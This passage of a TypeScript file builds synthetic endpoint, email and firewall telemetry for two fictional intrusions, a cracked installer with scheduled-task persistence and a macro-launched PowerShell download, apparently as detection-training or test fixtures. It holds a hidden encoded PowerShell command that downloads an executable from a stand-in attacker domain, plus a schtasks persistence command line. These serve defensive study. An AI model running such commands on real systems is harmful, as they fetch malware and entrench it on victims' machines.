        cmdline: `"${installerPath}"`,
        user: "NEXACORP\\y.golan", integrity: "medium",
        hash: { sha256: installerHash },
      },
      raw: {
        "Timestamp": T(6 * MIN),
        "ActionType": "ProcessCreated",
        "FileName": "Office_Pro_2026_Activator_Setup.exe",
        "FolderPath": installerPath,
        "SHA256": installerHash,
        "ProcessId": "6120",
        "ProcessCommandLine": `"${installerPath}"`,
        "ProcessIntegrityLevel": "Medium",
        "SignatureStatus": "Unsigned",
        "InitiatingProcessFileName": "explorer.exe",
        "InitiatingProcessId": "3140",
        "InitiatingProcessAccountName": "y.golan",
        "InitiatingProcessAccountDomain": "nexacorp",
        "DeviceName": victim.hostname,
        "AttackTechniques": ["T1204.002"],
        "ReportId": "889213",
      },
    },
    {
      id: "evt_crack_02b_drop", ts: T(6 * MIN + 15_000),
      source: "edr", vendor: "Microsoft Defender for Endpoint", event_type: "file_create",
      hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
      severity: "medium", mitre_technique: "T1204.002",
      file: { path: svchelperPath, sha256: payloadHash, size: 512000 },
      process: {
        name: "Office_Pro_2026_Activator_Setup.exe", pid: 6120, parent_name: "explorer.exe", parent_pid: 3140,
        path: installerPath, user: "NEXACORP\\y.golan", integrity: "medium", hash: { sha256: installerHash },
      },
      description: "Office_Pro_2026_Activator_Setup.exe on WS-ENG-2093 wrote svchelper.exe to C:\\ProgramData\\OfficeTools\\.",
      raw: {
        "ActionType": "FileCreated",
        "FileName": "svchelper.exe",
        "FolderPath": svchelperPath,
        "SHA256": payloadHash,
        "InitiatingProcessFileName": "Office_Pro_2026_Activator_Setup.exe",
        "InitiatingProcessFolderPath": installerPath,
        "InitiatingProcessSHA256": installerHash,
        "InitiatingProcessAccountName": "y.golan",
        "InitiatingProcessAccountDomain": "nexacorp",
        "DeviceName": victim.hostname,
        "ReportId": "889214",
      },
    },
    {
      id: "evt_crack_03_persist", ts: T(6 * MIN + 40_000),
      source: "edr", vendor: "Microsoft Defender for Endpoint", event_type: "process_create",
      hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
      severity: "high", mitre_technique: "T1053.005",
      // The installer runs as a Medium-integrity user, so it registers the task to run as
      // that user (no /ru SYSTEM — that would need admin and fail "Access is denied").
      description: "Office_Pro_2026_Activator_Setup.exe on WS-ENG-2093 ran schtasks.exe to register a task named OfficeLicenseRefresh that launches C:\\ProgramData\\OfficeTools\\svchelper.exe every 30 minutes and at logon.",
      process: {
        name: "schtasks.exe", pid: 6456, parent_name: "Office_Pro_2026_Activator_Setup.exe", parent_pid: 6120,
        path: "C:\\Windows\\System32\\schtasks.exe",
        cmdline: `schtasks.exe /create /tn "OfficeLicenseRefresh" /tr "${svchelperPath}" /sc minute /mo 30 /f`,
        user: "NEXACORP\\y.golan", integrity: "medium",
      },
      raw: {
        "Timestamp": T(6 * MIN + 40_000),
        "ActionType": "ProcessCreated",
        "FileName": "schtasks.exe",
        "FolderPath": "C:\\Windows\\System32\\schtasks.exe",
        "ProcessId": "6456",
        "ProcessCommandLine": `schtasks.exe /create /tn "OfficeLicenseRefresh" /tr "${svchelperPath}" /sc minute /mo 30 /f`,
        "ProcessIntegrityLevel": "Medium",
        "InitiatingProcessFileName": "Office_Pro_2026_Activator_Setup.exe",
        "InitiatingProcessId": "6120",
        "InitiatingProcessFolderPath": installerPath,
        "InitiatingProcessSHA256": installerHash,
        "InitiatingProcessAccountName": "y.golan",
        "InitiatingProcessAccountDomain": "nexacorp",
        "DeviceName": victim.hostname,
        "AttackTechniques": ["T1053.005"],
        "ReportId": "889215",
      },
    },
    {
      id: "evt_crack_04_taskrun", ts: T(7 * MIN + 30_000),
      source: "edr", vendor: "Microsoft Defender for Endpoint", event_type: "process_create",
      hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
      severity: "high", mitre_technique: "T1053.005",
      // The task runs as the registering user (y.golan, Medium) — Task Scheduler is the parent.
      description: "The OfficeLicenseRefresh task fired on WS-ENG-2093: svchelper.exe was launched by the Windows Task Scheduler service host under y.golan.",
      process: {
        name: "svchelper.exe", pid: 7020, parent_name: "svchost.exe", parent_pid: 1136,
        path: svchelperPath,
        cmdline: `"${svchelperPath}"`,
        user: "NEXACORP\\y.golan", integrity: "medium",
        hash: { sha256: payloadHash },
      },
      raw: {
        "Timestamp": T(7 * MIN + 30_000),
        "ActionType": "ProcessCreated",
        "FileName": "svchelper.exe",
        "FolderPath": svchelperPath,
        "SHA256": payloadHash,
        "ProcessId": "7020",
        "ProcessCommandLine": `"${svchelperPath}"`,
        "ProcessIntegrityLevel": "Medium",
        "SignatureStatus": "Unsigned",
        "InitiatingProcessFileName": "svchost.exe",
        "InitiatingProcessId": "1136",
        "InitiatingProcessFolderPath": "C:\\Windows\\System32\\svchost.exe",
        "InitiatingProcessCommandLine": "svchost.exe -k netsvcs -p -s Schedule",
        "InitiatingProcessAccountName": "system",
        "InitiatingProcessAccountDomain": "nt authority",
        "AccountName": "y.golan",
        "AccountDomain": "nexacorp",
        "DeviceName": victim.hostname,
        "AttackTechniques": ["T1053.005"],
        "ReportId": "889216",
      },
    },
    {
      // Impact: the payload calls out to its C2 — gives the analyst a network indicator and a reason
      // to treat the host's stored credentials as exposed.
      id: "evt_crack_04b_c2", ts: T(7 * MIN + 45_000),
      source: "edr", vendor: "Microsoft Defender for Endpoint", event_type: "net_connection",
      hostname: victim.hostname, user_email: victim.email,
      src_ip: victim.ip, dst_ip: c2Ip, dst_port: 443, src_port: 52660, protocol: "tcp",
      severity: "high", mitre_technique: "T1071.001",
      network: { domain: c2Domain },
      process: {
        name: "svchelper.exe", pid: 7020, parent_name: "svchost.exe", parent_pid: 1136,
        path: svchelperPath, user: "NEXACORP\\y.golan", integrity: "medium", hash: { sha256: payloadHash },
      },
      description: `svchelper.exe on WS-ENG-2093 connected to ${c2Domain} (${c2Ip}) on port 443.`,
      raw: {
        "ActionType": "ConnectionSuccess",
        "RemoteIP": c2Ip, "RemotePort": "443", "RemoteUrl": c2Domain,
        "LocalIP": victim.ip, "LocalPort": "52660",
        "InitiatingProcessFileName": "svchelper.exe",
        "InitiatingProcessFolderPath": svchelperPath,
        "InitiatingProcessSHA256": payloadHash,
        "InitiatingProcessAccountName": "y.golan",
        "InitiatingProcessAccountDomain": "nexacorp",
        "DeviceName": victim.hostname,
        "ReportId": "889217",
      },
    },
    {
      id: "evt_crack_05_detect", ts: T(9 * MIN),
      source: "edr", vendor: "Microsoft Defender for Endpoint", event_type: "av_quarantine",
      hostname: victim.hostname, user_email: victim.email,
      severity: "critical", mitre_technique: "T1053.005",
      file: { path: svchelperPath, sha256: payloadHash, size: 512000 },
      description: "Microsoft Defender quarantined svchelper.exe on WS-ENG-2093 and killed the running payload; the OfficeLicenseRefresh scheduled task is not recorded as removed.",
      raw: {
        "Timestamp": T(9 * MIN),
        "ActionType": "AntivirusDetection",
        "ThreatName": "Trojan:Win32/Wacatac.B!ml",
        "FileName": "svchelper.exe",
        "FolderPath": svchelperPath,
        "SHA256": payloadHash,
        "DeviceName": victim.hostname,
        "action_result": "quarantined",
      },
    },
  ];

  return { title: "Cracked Software Installer → Scheduled Task Persistence", events, T, MIN, downloadDomain, downloadIp, c2Domain, c2Ip, installerHash, payloadHash };
}

/** Telemetry half of `buildMaliciousMacroScenario`: the events and the story title, no answer key. */
export function maliciousMacroScenarioEvents() {
  const B = new Date("2026-06-01T11:20:00Z").getTime();
  const T = (ms: number) => new Date(B + ms).toISOString();
  const MIN = 60_000;

  const victim = { hostname: "WS-SALES-1876", email: "s.peretz@nexacorp.com", ip: "10.10.33.91" };
  const c2Domain = "invoice-sync-cdn.xyz";
  // Story-specific infrastructure (no other storyline uses these addresses).
  const c2Ip = "23.137.249.140";
  const senderIp = "5.181.80.66";
  const msgId = "<a41c07e2.9d3f.4b8e@client-invoices-portal.info>";
  const docmHash = makeSha256("q3_client_invoice_review_docm_donoff");
  const invHash = makeSha256("macro_stage2_inv_exe_payload");
  const docmPath = "C:\\Users\\s.peretz\\Downloads\\Q3_Client_Invoice_Review.docm";

  const events: TelemetryEvent[] = [
    {
      // Delivered clean: Safe Attachments had no verdict at delivery time; the
      // Malware ZAP row below convicts the same message later (MDO never
      // delivers a Malware verdict).
      id: "evt_macro_01_email", ts: T(0),
      source: "o365", vendor: "Microsoft Defender for Office 365", event_type: "email_received",
      user_email: victim.email, src_ip: senderIp,
      severity: "medium", mitre_technique: "T1566.001",
      description: "s.peretz received an email with a macro-enabled Word attachment (Q3_Client_Invoice_Review.docm) from an external sender; SPF, DKIM and DMARC all failed and the message was delivered to the inbox.",
      raw: {
        "event.action": "EmailDelivered", "event.outcome": "success",
        "InternetMessageId": msgId,
        "email.from.address": "billing@client-invoices-portal.info",
        "email.to.address": victim.email,
        "email.subject": "Q3 Invoice Review — Please Confirm by Friday",
        "email.attachments.file.name": "Q3_Client_Invoice_Review.docm",
        "email.attachments.file.hash.sha256": docmHash,
        "email.attachments.file.size": 48210,
        "email.direction": "inbound",
        "source.ip": senderIp,
        "spf.result": "fail", "dkim.result": "fail", "dmarc.result": "fail",
        "action_result": "delivered",
      },
    },
    {
      // The attachment row of the same message — the docm's SHA256 lives here,
      // not in EmailEvents; it is the pivot to the file on the endpoint.
      id: "evt_macro_01b_attachment", ts: T(0),
      source: "o365", vendor: "Microsoft Defender for Office 365", event_type: "email_received",
      user_email: victim.email,
      severity: "informational", mitre_technique: "T1566.001",
      description: "The message's attachment record lists Q3_Client_Invoice_Review.docm (48,210 bytes) with its SHA256.",
      raw: {
        "category": "AdvancedHunting-EmailAttachmentInfo",
        "InternetMessageId": msgId,
        "email.from.address": "billing@client-invoices-portal.info",
        "email.to.address": victim.email,
        "email.subject": "Q3 Invoice Review — Please Confirm by Friday",
        "email.attachments.file.name": "Q3_Client_Invoice_Review.docm",
        "email.attachments.file.hash.sha256": docmHash,
        "email.attachments.file.size": 48210,
        "email.direction": "inbound",
        "source.ip": senderIp,
        "action_result": "delivered",
      },
    },
    {
      id: "evt_macro_02_powershell", ts: T(8 * MIN),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "process_create",
      hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
      severity: "high", mitre_technique: "T1059.001",
      description: "s.peretz opened Q3_Client_Invoice_Review.docm and enabled content; WINWORD.EXE on WS-SALES-1876 then spawned powershell.exe with a hidden window and an encoded command.",
      process: {
        name: "powershell.exe", pid: 7340, parent_name: "WINWORD.EXE", parent_pid: 4512,
        cmdline: "powershell.exe -NoP -W Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AaQBuAHYAbwBpAGMAZQAtAHMAeQBuAGMALQBjAGQAbgAuAHgAeQB6AC8AaQBuAHYALgBlAHgAZQAgAC0ATwB1AHQARgBpAGwAZQAgACQAZQBuAHYAOgBUAEUATQBQAFwAaQBuAHYALgBlAHgAZQA=",
        user: "NEXACORP\\s.peretz", integrity: "medium",
      },
      raw: {
        "crowdstrike.event_simpleName": "ProcessRollup2",
        "process.pid": "7340",
        "process.executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "process.command_line": "powershell.exe -NoP -W Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AaQBuAHYAbwBpAGMAZQAtAHMAeQBuAGMALQBjAGQAbgAuAHgAeQB6AC8AaQBuAHYALgBlAHgAZQAgAC0ATwB1AHQARgBpAGwAZQAgACQAZQBuAHYAOgBUAEUATQBQAFwAaQBuAHYALgBlAHgAZQA=",
        "process.parent.name": "WINWORD.EXE",
        "process.parent.pid": "4512",
        "user.name": "NEXACORP\\s.peretz",
        "host.name": victim.hostname,
      },
    },
    {
      // The first page: the EDR's behavioural alert on the Word → PowerShell
      // chain, seconds after the process started (detect-only on this host group).
      id: "evt_macro_02b_alert", ts: T(8 * MIN + 6_000),
      source: "edr", vendor: "Microsoft Defender for Endpoint", event_type: "edr_alert",
      hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
      severity: "high", mitre_technique: "T1059.001", mitre_tactic: "Execution",
      is_detection: true,
      description: "The EDR raised a high-severity alert on WS-SALES-1876: WINWORD.EXE started powershell.exe with a hidden window and an encoded command; the policy action was detect-only.",
      process: {
        name: "powershell.exe", pid: 7340, parent_name: "WINWORD.EXE", parent_pid: 4512,
        cmdline: "powershell.exe -NoP -W Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AaQBuAHYAbwBpAGMAZQAtAHMAeQBuAGMALQBjAGQAbgAuAHgAeQB6AC8AaQBuAHYALgBlAHgAZQAgAC0ATwB1AHQARgBpAGwAZQAgACQAZQBuAHYAOgBUAEUATQBQAFwAaQBuAHYALgBlAHgAZQA=",
        user: "NEXACORP\\s.peretz", integrity: "medium",
      },
      raw: {
        "crowdstrike.event_simpleName": "DetectionSummaryEvent",
        "mde.AlertTitle": "Suspicious PowerShell command line",
        "crowdstrike.detection.tactic": "Execution",
        "crowdstrike.detection.tactic_id": "TA0002",
        "crowdstrike.detection.technique": "Command and Scripting Interpreter: PowerShell",
        "crowdstrike.detection.technique_id": "T1059.001",
        "crowdstrike.detection.pattern_disposition": "0",
        "crowdstrike.detection.pattern_disposition_description": "Detection, standard detection.",
        "crowdstrike.detection.severity": "High",
        "host.name": victim.hostname,
        "action_result": "detected",
      },
    },
    {
      // The decoded command is an HTTP (port 80) download of inv.exe, so the
      // firewall sees web-browsing on 80 and logs the file transfer by name.
      id: "evt_macro_03_download", ts: T(8 * MIN + 25_000),
      source: "firewall", vendor: "Palo Alto Networks PAN-OS", event_type: "http_request",
      hostname: victim.hostname, user_email: victim.email,
      src_ip: victim.ip, dst_ip: c2Ip, dst_port: 80, protocol: "tcp",
      severity: "high", mitre_technique: "T1105",
      network: { url: `http://${c2Domain}/inv.exe`, domain: c2Domain, method: "GET", bytes_out: 412, bytes_in: 286_720 },
      file: { name: "inv.exe", path: "inv.exe", sha256: invHash, size: 284_160 },
      description: "WS-SALES-1876 downloaded inv.exe (Windows executable) over HTTP from invoice-sync-cdn.xyz, a newly registered domain; the firewall allowed the transfer.",
      raw: {
        "event.action": "network-connection-allowed", "event.outcome": "success",
        "source.ip": victim.ip, "source.port": "55931",
        "destination.ip": c2Ip, "destination.port": "80",
        "network.protocol": "tcp", "network.transport": "tcp",
        "network.application": "web-browsing",
        "pan.app": "web-browsing", "pan.action": "allow",
        "url.full": `http://${c2Domain}/inv.exe`,
        "url.category": "newly-registered-domain",
        "pan.filename": "inv.exe",
        "action_result": "allow",
      },
    },
    {
      id: "evt_macro_03b_drop", ts: T(8 * MIN + 27_000),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "file_create",
      hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
      severity: "high", mitre_technique: "T1105",
      file: { path: "C:\\Users\\s.peretz\\AppData\\Local\\Temp\\inv.exe", sha256: invHash, size: 284_160 },
      process: {
        name: "powershell.exe", pid: 7340, parent_name: "WINWORD.EXE", parent_pid: 4512,
        path: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        user: "NEXACORP\\s.peretz", integrity: "medium",
      },
      description: "powershell.exe on WS-SALES-1876 wrote inv.exe to s.peretz's %TEMP% folder.",
      raw: {
        "crowdstrike.event_simpleName": "NewExecutableWritten",
        "file.path": "C:\\Users\\s.peretz\\AppData\\Local\\Temp\\inv.exe",
        "file.hash.sha256": invHash,
        "host.name": victim.hostname,
        "user.name": "NEXACORP\\s.peretz",
      },
    },
    {
      id: "evt_macro_04_payload_blocked", ts: T(8 * MIN + 29_000),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "av_quarantine",
      hostname: victim.hostname, user_email: victim.email,
      severity: "critical", mitre_technique: "T1105",
      file: { path: "C:\\Users\\s.peretz\\AppData\\Local\\Temp\\inv.exe", sha256: invHash, size: 284_160 },
      description: "The EDR quarantined inv.exe in %TEMP% on WS-SALES-1876 two seconds after it was written, before any process was started from it.",
      raw: {
        "crowdstrike.event_simpleName": "DetectionSummaryEvent",
        "threat.name": "Trojan:Win32/Wacatac.B!ml",
        "crowdstrike.detection.tactic": "Command and Control",
        "crowdstrike.detection.technique": "Ingress Tool Transfer",
        "crowdstrike.detection.technique_id": "T1105",
        "crowdstrike.detection.pattern_disposition_description": "Prevention, Quarantine File",
        "crowdstrike.detection.severity": "Critical",
        "file.hash.sha256": invHash,
        "host.name": victim.hostname,
        "action_result": "quarantined",
      },
    },
    {
      id: "evt_macro_05_docm_quarantine", ts: T(11 * MIN),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "av_quarantine",
      hostname: victim.hostname, user_email: victim.email,
      severity: "high", mitre_technique: "T1204.002",
      file: { path: docmPath, sha256: docmHash, size: 48210 },
      description: "The EDR quarantined Q3_Client_Invoice_Review.docm in s.peretz's Downloads folder on WS-SALES-1876 (same SHA256 as the email attachment).",
      raw: {
        "crowdstrike.event_simpleName": "DetectionSummaryEvent",
        "threat.name": "TrojanDownloader:O97M/Donoff!MTB",
        "crowdstrike.detection.tactic": "Execution",
        "crowdstrike.detection.technique": "User Execution: Malicious File",
        "crowdstrike.detection.technique_id": "T1204.002",
        "crowdstrike.detection.pattern_disposition_description": "Prevention, Quarantine File",
        "crowdstrike.detection.severity": "High",
        "file.hash.sha256": docmHash,
        "host.name": victim.hostname,
        "action_result": "quarantined",
      },
    },
    {
      id: "evt_macro_06_zap", ts: T(12 * MIN),
      source: "o365", vendor: "Microsoft Defender for Office 365", event_type: "email_quarantined",
      user_email: victim.email,
      severity: "medium", mitre_technique: "T1566.001",
      description: "Zero-hour auto purge (ZAP) moved the \"Q3 Invoice Review\" message from s.peretz's inbox to quarantine with a Malware verdict.",
      raw: {
        "InternetMessageId": msgId,
        "email.from.address": "billing@client-invoices-portal.info",
        "email.to.address": victim.email,
        "email.subject": "Q3 Invoice Review — Please Confirm by Friday",
        "email.attachments.file.name": "Q3_Client_Invoice_Review.docm",
        "email.attachments.file.hash.sha256": docmHash,
        "email.direction": "inbound",
        "Action": "Moved to quarantine",
        "ActionTrigger": "ZAP",
        "ActionResult": "Success",
        "ThreatTypes": "Malware",
        "DeliveryLocation": "Quarantine",
      },
    },
  ];

  return { title: "Malicious Office Macro → PowerShell Download Blocked", events, T, MIN, c2Domain, c2Ip, docmHash, invHash };
}
